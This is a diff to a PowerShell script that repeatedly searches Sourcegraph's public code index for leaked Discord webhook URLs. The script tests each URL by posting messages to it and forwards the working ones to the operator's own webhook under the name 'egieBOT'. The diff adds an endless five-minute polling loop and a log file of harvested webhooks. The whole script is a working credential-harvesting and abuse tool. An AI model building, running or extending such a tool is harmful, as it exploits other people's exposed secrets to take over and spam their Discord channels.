@@ -47,6 +47,14 @@ $apiUrl = "https://sourcegraph.com/.api/search/stream"
 $context = "context:global"
 $webhookPattern = "https://discord.com/api/webhooks/"
 $timestamp = Get-Date -Format "dd/MM/yyyy  @  HH:mm"
+# delay between searches
+$sleeptimer = 300
+
+# Create found webhooks file
+$filePath = "Found-Webhooks.txt"
+if (!(Test-Path $filePath)){
+"FOUND WEBHOOKS :" | Out-File -FilePath $filePath -Append -Force
+}
 
 # Ask for Webhook Information 
 if ($hookurl.Length -ne 121){
@@ -138,53 +146,71 @@ if ($hookurl.Length -eq 121){
     Irm -Uri $hookurl -Method Post -Body $jsonString -ContentType 'application/json'
 }
 
-# Encode the query for the URL
-$encodedQuery = [uri]::EscapeDataString($context)
-$encodedwh = [uri]::EscapeDataString($webhookPattern)
-
-# Construct the full URL
-$fullUrl = ("$apiUrl" + '?q=' + "$encodedQuery" + '+' + "$encodedwh")
-
-# Make the web request
-try {
-$response = Irm -Uri $fullUrl -Method Get -Headers @{ 'Accept' = 'text/event-stream' }
+while ($true){
+    Write-Host "Sleep timer set to $sleeptimer Seconds" -ForegroundColor Yellow
     
-# Define the URL pattern to match
-$urlPattern = "https://discord\.com/api/webhooks/\d+/[A-Za-z0-9_-]+"
-
-# Use Select-String to find all matches
-Write-Host "Searching API response for matching webhooks.." -ForegroundColor Yellow
-$matches = $response | Select-String -Pattern $urlPattern -AllMatches | ForEach-Object { $_.Matches.Value }
-
-# Filter and display matches based on character count
-$filteredMatches = $matches | Where-Object { $_.Length -eq 121 }
-sleep 1
-
-# Check if any filtered matches were found
-    if ($filteredMatches.Count -gt 0) {
-        Write-Host "Found matching URLs. Starting Connection Test.." -ForegroundColor Green
-        $filteredMatches | ForEach-Object {
-        sleep -m 500
-        $hook = $_
-        Write-Host "Trying : $hook" -ForegroundColor DarkGray
-        # Test the webhook validity
-        try{
-            WebhookSend
+    # Encode the query for the URL
+    $encodedQuery = [uri]::EscapeDataString($context)
+    $encodedwh = [uri]::EscapeDataString($webhookPattern)
+    
+    # Construct the full URL
+    $fullUrl = ("$apiUrl" + '?q=' + "$encodedQuery" + '+' + "$encodedwh")
+    
+    # Make the web request
+    try {
+    $response = Irm -Uri $fullUrl -Method Get -Headers @{ 'Accept' = 'text/event-stream' }
+        
+    # Define the URL pattern to match
+    $urlPattern = "https://discord\.com/api/webhooks/\d+/[A-Za-z0-9_-]+"
+    
+    # Use Select-String to find all matches
+    Write-Host "Searching API response for matching webhooks.." -ForegroundColor Yellow
+    $matches = $response | Select-String -Pattern $urlPattern -AllMatches | ForEach-Object { $_.Matches.Value }
+    
+    # Filter and display matches based on character count
+    $filteredMatches = $matches | Where-Object { $_.Length -eq 121 }
+    sleep 1
+    
+    # Check if any filtered matches were found
+        if ($filteredMatches.Count -gt 0) {
+            Write-Host "Found matching URLs. Starting Connection Test.." -ForegroundColor Green
+            $filteredMatches | ForEach-Object {
             sleep -m 500
-            # If successful send a notification
-            $jsonsys = @{"username" = "egieBOT" ;"content" = "FOUND WEBHOOK > $hook"} | ConvertTo-Json
-            Irm -Uri $hookUrl -Method Post -Body $jsonsys -ContentType 'application/json'
-            Write-Host "Webhook FOUND! : $hook"
-        }
-        # if invalid show error in console
-        catch{
-            Write-Host "Webhook not valid : $_" -ForegroundColor Red  
+            $hook = $_
+            Write-Host "Trying : $hook" -ForegroundColor DarkGray
+    
+            foreach ($line in Get-Content $filePath) {
+                # Check if the line matches the variable
+                if ($line -eq $hook) {
+                    Write-Host "Already Found: $line`n" -ForegroundColor Yellow
+                    return
+                    }
+                }
+            
+            # Test the webhook validity
+            try{
+                WebhookSend
+                sleep -m 500
+                # If successful send a notification
+                $jsonsys = @{"username" = "egieBOT" ;"content" = "FOUND WEBHOOK > $hook"} | ConvertTo-Json
+                Irm -Uri $hookUrl -Method Post -Body $jsonsys -ContentType 'application/json'
+                Write-Host "Webhook FOUND! : $hook"
+                $hook | Out-File -FilePath $filePath -Append -Force
+            }
+            # if invalid show error in console
+            catch{
+                Write-Host "Webhook not valid : $_`n" -ForegroundColor Red  
+            }
         }
     }
-}
-else{Write-Host "No matching URLs."}
-} 
-catch{Write-Host "Error: $_"}
+    else{Write-Host "No matching URLs."}
+    } 
+    catch{Write-Host "Error: $_"}
 
+Write-Host "Sleeping for 5 minutes...`n" -ForegroundColor Yellow
+Sleep $sleeptimer
+Header
+}
 # Hold the script to view results before closing
 pause
+
